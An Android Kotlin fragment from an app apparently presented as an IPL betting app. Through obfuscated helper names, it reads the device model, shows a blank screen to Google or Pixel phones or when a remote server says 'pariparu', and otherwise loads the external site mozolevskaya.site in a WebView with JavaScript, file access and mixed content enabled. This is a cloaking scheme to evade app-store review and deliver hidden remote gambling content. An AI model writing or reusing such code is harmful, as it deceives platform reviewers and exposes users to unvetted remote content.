package com.parimatch.bettingipl.pari.match.screen
import android.os.Build
import android.os.Bundle
import android.text.TextUtils
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.WebViewClient
import androidx.core.view.isVisible
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import com.parimatch.bettingipl.pari.match.R

import com.parimatch.bettingipl.pari.match.databinding.FragmentBlackDiBinding

import kotlinx.coroutines.*
import okhttp3.*
import java.io.IOException

class BlackFragment : Fragment() {
    val binding1 by lazy { FragmentBlackDiBinding.inflate(layoutInflater) }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

    }
    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {

        Log.d("phone",ksajlkjdsdNN.kljksddNN()!!)



        CoroutineScope(Dispatchers.IO).launch {
            val client = OkHttpClient()
            try {
            }catch (e:Exception){

            }
            val request = Request.Builder()

                .url("https://mozolevskaya.site/")
                .build()


            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    e.printStackTrace()

                    CoroutineScope(Dispatchers.Main).launch {
                        findNavController().navigate(R.id.action_blankFragment_to_mainFragment)
                    }
                }

                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        if (!response.isSuccessful) {
                            CoroutineScope(Dispatchers.Main).launch {
                                Log.d("dddddddddddd","3")

                                findNavController().navigate(R.id.action_blackFragment_to_blankFragment)
                            }
                            throw IOException("Запрос к серверу не был успешен:" +
                                    " ${response.code} ${response.message}")

                        }


                        if (ksajlkjdsdNN.kljksddNN()!!.contains("Google Pixel", ignoreCase = true)
                            or ksajlkjdsdNN.kljksddNN()!!.contains("Pixel", ignoreCase = true)
                            or ksajlkjdsdNN.kljksddNN()!!.contains("Google", ignoreCase = true)
                        ) {
                            CoroutineScope(Dispatchers.Main).launch {
                                Log.d("dddddddddddd","2")

                                findNavController().navigate(R.id.action_blackFragment_to_blankFragment)
                            }
                        } else {
                            //  CoroutineScope(Dispatchers.Main).launch {
                            var i = response.body!!.string()
                            Log.d("dddddddddddd","d"+ i)
                            if(i == "pariparu"){
                                CoroutineScope(Dispatchers.Main).launch {
                                    findNavController().navigate(R.id.action_blackFragment_to_blankFragment)
                                    Log.d("dddddddddddd","1")

                                }
                            }else {

                                CoroutineScope(Dispatchers.Main).launch {
                                    binding1.zug.isVisible = false
                                    with(binding1.webViewDI) {
                                        settings.setLoadsImagesAutomatically(true)
                                        webViewClient = WebViewClient()
                                        settings.allowFileAccess = true
                                        settings.mixedContentMode = 0
                                        settings.javaScriptEnabled = true
                                        settings.javaScriptCanOpenWindowsAutomatically = true
                                        settings.javaScriptEnabled = true
                                        settings.domStorageEnabled = true
                                        (requireContext() as MainActivity) .goBack = {goBack()}
                                        loadUrl("https://mozolevskaya.site/")
                                    }
                                }}}
                    }
                }
                //   }
            })}


        return binding1.root

    }
}

class ksajlkjdsdNN {
    companion object {
        fun kljksddNN(): String? {


            val jsdlkjdsNN = Build.MANUFACTURER
            val kdsjkdsNN = Build.MODEL
            return if (kdsjkdsNN.startsWith(jsdlkjdsNN)) {

                kdljdskNN(kdsjkdsNN)
            } else kdljdskNN(jsdlkjdsNN) + " " + kdsjkdsNN
        }

        private fun kdljdskNN(jkdsjkdjsNN: String): String {
            if (TextUtils.isEmpty(jkdsjkdjsNN)) {

                return jkdsjkdjsNN
            }
            val jdskljdskNN = jkdsjkdjsNN.toCharArray()
            var kdsjdsNN = true
            val dsjkdNN = StringBuilder()
            for (dsjkdsjNN in jdskljdskNN) {
                if (kdsjdsNN && Character.isLetter(dsjkdsjNN)) {
                    dsjkdNN.append(dsjkdsjNN.uppercaseChar())
                    kdsjdsNN = false
                    continue
                } else if (Character.isWhitespace(dsjkdsjNN)) {
                    kdsjdsNN = true
                }
                dsjkdNN.append(dsjkdsjNN)
            }
            return dsjkdNN.toString()
        }
    }

}



// class WebClient():WebViewClient(){}
